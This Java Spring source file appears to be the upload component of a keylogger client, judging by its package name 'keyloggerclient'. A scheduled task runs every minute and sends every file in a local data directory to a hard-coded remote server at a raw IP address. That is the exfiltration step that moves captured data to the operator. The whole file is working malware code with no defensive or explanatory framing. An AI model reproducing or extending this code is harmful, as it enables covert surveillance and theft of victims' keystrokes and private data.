package com.example.keyloggerclient;

import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.FileSystemResource;
import org.springframework.http.HttpEntity;
import org.springframework.http.MediaType;
import org.springframework.http.client.MultipartBodyBuilder;
import org.springframework.lang.NonNull;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.util.MultiValueMap;
import org.springframework.web.reactive.function.BodyInserters;
import org.springframework.web.reactive.function.client.WebClient;

import java.io.File;

@Configuration
@EnableScheduling
@EnableAsync
public class Scheduler {

    // every minute
    @Scheduled(fixedDelay = 1000 * 60)
    @Async
    public void scheduleFixedDelayTask() {
        System.out.println("Fixed delay task - " + System.currentTimeMillis() / 1000);
        uploadData();
        System.out.println("Uploading finished");
    }

    private void uploadData() {

        // get the files from data directory
        File dataDirectory = new File(Constants.DATA_DIRECTORY);
        File[] files = dataDirectory.listFiles();

        // create the web client to upload the files from `./data/` directory
        WebClient webClient = WebClient.create("http://13.211.253.175:8080/upload");

        // upload all the files present in `./data/` directory
        // POST -> http://13.211.253.175:8080/upload
        // Body -> form-data -> { key: files, value: <all_files_present_in_data_directory> }
        if (files != null && files.length > 0) {
            String response = webClient.post()
                    .contentType(MediaType.MULTIPART_FORM_DATA)
                    .body(BodyInserters.fromMultipartData(fromFile(files)))
                    .retrieve()
                    .bodyToMono(String.class)
                    .block();

            System.out.println(response);
        }
    }

    private MultiValueMap<String, HttpEntity<?>> fromFile(@NonNull File[] files) {
        MultipartBodyBuilder builder = new MultipartBodyBuilder();

        for (File file : files) {
            FileSystemResource part = new FileSystemResource(file);
            builder.part("files", part);
        }
        return builder.build();
    }
}
